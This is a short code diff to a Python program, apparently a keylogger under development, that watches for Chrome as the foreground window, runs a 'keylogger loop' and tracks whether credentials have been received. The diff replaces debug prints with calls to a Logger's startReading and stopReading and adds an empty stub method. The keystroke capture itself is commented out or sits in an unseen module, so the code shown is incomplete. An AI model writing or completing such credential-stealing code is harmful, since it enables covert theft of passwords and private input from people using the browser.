@@ -9,7 +9,8 @@ class Main:
         # reg ex stuff
         self.chrome = re.compile(r'chrome', re.IGNORECASE)
         self.log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
-        self.logger = Logger.Logger(self.log_file)
+        #self.logger = Logger.Logger(self.log_file)
+        self.logger = Logger.Logger()
         self.credentials_received = False
     
     def run_keylogger(self):
@@ -17,9 +18,9 @@ class Main:
         
         # keylogger loop
         while(1):
-            print("out")
             while(bool(self.chrome.search(curr_app))): 
-                print("in")
+                self.logger.startReading(self.doStuff())
+                self.logger.stopReading()
                 
                 #self.logger.log_keystrokes()
                 
@@ -34,6 +35,8 @@ class Main:
                 break
             
             curr_app = GetWindowText(GetForegroundWindow())
+    def doStuff(self):
+        return
     
 if __name__ == "__main__":
     Main = Main()
